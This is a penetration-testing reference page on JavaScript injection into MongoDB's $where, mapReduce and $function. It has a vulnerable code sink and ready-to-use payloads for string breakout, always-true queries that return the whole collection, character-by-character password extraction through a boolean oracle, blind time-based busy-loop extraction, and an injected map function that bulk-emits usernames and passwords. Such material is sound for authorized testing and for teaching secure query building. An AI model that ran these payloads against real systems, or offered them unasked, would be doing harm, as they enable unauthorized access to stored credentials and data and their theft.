---
title: "MongoDB $where and mapReduce server-side JavaScript injection"
description: "$where and mapReduce evaluate server-side JavaScript; where enabled, injected JS strings break out of expressions, force always-true conditions, and time out blindly."
keywords:
  - $where
  - mapReduce
  - server-side JavaScript
  - MongoDB injection
  - JavaScript breakout
  - blind time-based
---

# Where JavaScript

`$where` and `mapReduce` evaluate JavaScript **server-side** against each document, which makes any user input that reaches their code string a JavaScript injection sink rather than merely an operator sink.

## Availability precondition

Server-side JavaScript is **enabled by default**: `security.javascriptEnabled` defaults to `true`, so `$where`, `mapReduce`, and `$function` run unless an operator has explicitly turned scripting off. It is deprecated in recent releases and some hardened deployments disable it, so treat execution as the default but confirm it on the target. `$where` cannot use query operators and must be a JavaScript expression or function, so this sink is reachable where the application builds a `$where` string (or passes input into `mapReduce`/`$function`) from input. Where an operator has disabled scripting, these payloads error and the operator techniques elsewhere in this subtree are the path.

## The sink

```javascript
// user input concatenated into a $where string
db.collection("users").find({
  $where: "this.username == '" + req.body.username + "'"
});
```

The input lands inside a JavaScript string compared per document, so a quote closes the string and the rest is parsed as JavaScript.

## JavaScript-string breakout

Close the literal and force the whole expression true, exactly as in SQL string breakout but in JavaScript syntax:

```
' || '1'=='1
' || true || '
a'; return true; var x='
```

The first makes the per-document predicate `this.username == '' || '1'=='1'`, true for every document, returning the entire collection. A function-valued `$where` is replaced wholesale when the input controls it:

```javascript
{ "$where": "function(){ return true; }" }
```

Because `$where` runs real JavaScript, the expression can read other fields of the current document to exfiltrate through a boolean oracle:

```
' || this.password[0]=='a' || '
' || this.role=='admin' || '
```

Each request tests one condition about another field, and the match/no-match signal recovers the value character by character, the same oracle loop used with `$regex` but expressed in JavaScript.

## Blind time-based via a busy loop

Where no result difference is observable but JavaScript is enabled, delay execution and measure response time. The server-side `$where` scope does not expose the shell helper `sleep()` (that global exists only in the mongo shell), so a `sleep(5000)` call raises `ReferenceError` instead of pausing. The portable primitive is a CPU busy-wait that spins until a wall-clock deadline, run only when the probed condition holds:

```
' || (this.username=='admin' && (function(){var t=Date.now();while(Date.now()-t<5000){}return true})()) || '
```

```javascript
{ "$where": "function(){ if (this.role=='admin') { var t=Date.now(); while(Date.now()-t<5000){} } return false; }" }
```

A slow response means the condition was true. Bound the loop by anchoring on one field at a time (`this.secret[0]=='a'`, then `[1]`, and so on), inferring each character from whether the request hangs. Because `$where` executes against every document in the scan, keep the matched set small (pin a username first) so the delay is attributable and the scan stays cheap.

## mapReduce

`mapReduce` runs JavaScript `map` and `reduce` functions server-side and is subject to the same `javascriptEnabled` gate. Where input reaches those function bodies, the same breakout and inference apply, with the emitted keys/values as the output channel:

```javascript
db.collection.mapReduce(
  "function(){ emit(this.username, this.password); }",  // injected map body
  "function(k,v){ return v; }",
  { out: { inline: 1 } }
);
```

An injected `map` that emits sensitive fields turns the reduce output into a bulk extraction channel when the result is reflected.

## Tools

- **mongosh**: test $where and mapReduce JavaScript payloads against a database.
- **Burp Repeater**: deliver JavaScript breakout and time-based payloads through the sink.
- **NoSQLMap**: automate $where injection detection and extraction.

## References

- [MongoDB: $where](https://www.mongodb.com/docs/manual/reference/operator/query/where/)
- [MongoDB: Server-side JavaScript](https://www.mongodb.com/docs/manual/core/server-side-javascript/)
- [MongoDB: mapReduce](https://www.mongodb.com/docs/manual/reference/command/mapReduce/)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
